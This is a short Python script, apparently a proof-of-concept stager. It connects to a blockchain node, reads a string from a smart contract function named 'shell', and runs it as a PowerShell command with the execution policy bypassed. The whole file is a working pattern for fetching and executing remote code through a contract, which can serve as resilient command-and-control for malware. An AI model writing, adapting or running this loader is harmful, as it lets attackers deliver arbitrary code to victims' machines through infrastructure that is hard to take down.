from web3 import Web3
import subprocess

w3 = Web3(
    Web3.HTTPProvider("https://node")
)

contract_address = w3.to_checksum_address(
    "Contract Address"
)

abi = [
    {
        "inputs": [],
        "name": "shell",
        "outputs": [
            {
                "internalType": "bytes",
                "name": "",
                "type": "bytes"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
]

contract = w3.eth.contract(
    address=contract_address,
    abi=abi
)

print("[+] Calling contract..")
result = contract.functions.shell().call()

payload = result.decode('utf-8')

print("[+] Receiving payload and executing...")
try:
    subprocess.run([
        "powershell.exe", 
        "-NoProfile", 
        "-ExecutionPolicy", "Bypass", 
        "-Command", f"& {{{payload}}}"
    ], check=True)
except Exception as e:
    print(f"Error: {e}")
